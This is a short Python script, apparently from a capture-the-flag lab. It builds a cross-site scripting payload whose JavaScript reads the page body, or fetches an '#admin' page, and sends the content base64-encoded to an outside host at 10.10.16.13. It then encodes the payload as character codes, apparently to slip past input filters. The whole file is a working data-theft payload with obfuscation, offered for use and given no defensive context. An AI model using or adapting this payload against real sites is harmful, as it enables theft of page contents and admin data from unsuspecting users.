# target = "var req = new XMLHttpRequest(); req.open('GET', 'http://10.10.16.13/?xss=' + btoa(document.body.innerHTML), true);req.send();" #paste your code here
target = """var req1 = new XMLHttpRequest();
req1.open('GET', '#admin', true);
req1.onreadystatechange = function() {
    if (req1.readyState === req1.DONE) {
        if (req1.status === 200) {
            var req2 = new XMLHttpRequest();
            req2.open('GET', 'http://10.10.16.13/?xss=' + btoa(req1.responseText), true);
            req2.send();
        }
    }
};
req1.send();"""
result = []
for c in target:
    result.append(str(ord(c)))
print (', '.join(result))